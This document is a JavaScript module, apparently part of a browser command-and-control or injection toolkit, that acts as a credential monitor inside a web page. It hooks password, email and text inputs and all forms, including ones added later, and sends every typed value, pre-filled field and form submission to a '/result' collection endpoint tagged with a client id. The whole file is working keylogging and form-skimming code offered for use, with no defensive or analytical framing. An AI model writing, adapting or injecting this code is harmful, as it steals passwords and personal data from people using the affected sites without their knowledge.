if (window.__pzCredMon) return 'already active';
window.__pzCredMon = true;

var SELECTORS = 'input[type=password],input[type=email],input[type=text],input[type=tel],input[type=url],input[type=search],input:not([type])';

function report(data) {
  fetch('/result', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ cid: window.__pzCid, cmd_id: 'cred_monitor', result: data })
  });
}

function fieldInfo(el) {
  return {
    tag: el.tagName.toLowerCase(),
    type: el.type || '',
    name: el.name || '',
    id: el.id || '',
    placeholder: el.placeholder || '',
    autocomplete: el.getAttribute('autocomplete') || ''
  };
}

function watchField(inp) {
  if (inp.__pzCMW) return;
  inp.__pzCMW = true;
  var handler = function () {
    report({
      event: 'field_change',
      url: location.href,
      field: fieldInfo(inp),
      value: inp.value,
      ts: Date.now()
    });
  };
  inp.addEventListener('change', handler);
  inp.addEventListener('input', handler);
}

function watchForm(form) {
  if (form.__pzCMF) return;
  form.__pzCMF = true;
  form.addEventListener('submit', function () {
    var fields = {};
    for (var i = 0; i < form.elements.length; i++) {
      var el = form.elements[i];
      var key = el.name || el.id || el.type + '_' + i;
      if (el.type === 'checkbox' || el.type === 'radio') {
        fields[key] = el.checked ? el.value : '';
      } else {
        fields[key] = el.value;
      }
    }
    report({
      event: 'form_submit',
      url: location.href,
      action: form.action || '',
      method: form.method || 'GET',
      fields: fields,
      ts: Date.now()
    });
  }, true);
}

function scanNode(root) {
  if (!root.querySelectorAll) return;
  root.querySelectorAll(SELECTORS).forEach(watchField);
  root.querySelectorAll('form').forEach(watchForm);
}

// Immediate scan: report pre-filled values
var prefilled = [];
document.querySelectorAll(SELECTORS).forEach(function (inp) {
  watchField(inp);
  if (inp.value) {
    prefilled.push({ field: fieldInfo(inp), value: inp.value });
  }
});
document.querySelectorAll('form').forEach(watchForm);

if (prefilled.length) {
  report({ event: 'prefilled_scan', url: location.href, fields: prefilled, ts: Date.now() });
}

// MutationObserver for dynamic content
var obs = new MutationObserver(function (muts) {
  muts.forEach(function (m) {
    m.addedNodes.forEach(function (n) {
      if (n.nodeType !== 1) return;
      if (n.tagName === 'INPUT') watchField(n);
      if (n.tagName === 'FORM') watchForm(n);
      scanNode(n);
    });
  });
});
obs.observe(document.body, { childList: true, subtree: true });

// Global submit interceptor
document.addEventListener('submit', function (e) {
  var form = e.target;
  if (form.__pzCMF) return; // already hooked
  watchForm(form);
  var fields = {};
  for (var i = 0; i < form.elements.length; i++) {
    var el = form.elements[i];
    var key = el.name || el.id || el.type + '_' + i;
    fields[key] = el.type === 'checkbox' || el.type === 'radio' ? (el.checked ? el.value : '') : el.value;
  }
  report({ event: 'form_submit', url: location.href, action: form.action || '', method: form.method || 'GET', fields: fields, ts: Date.now() });
}, true);

return 'credential monitor active — watching inputs, forms, and dynamic content';
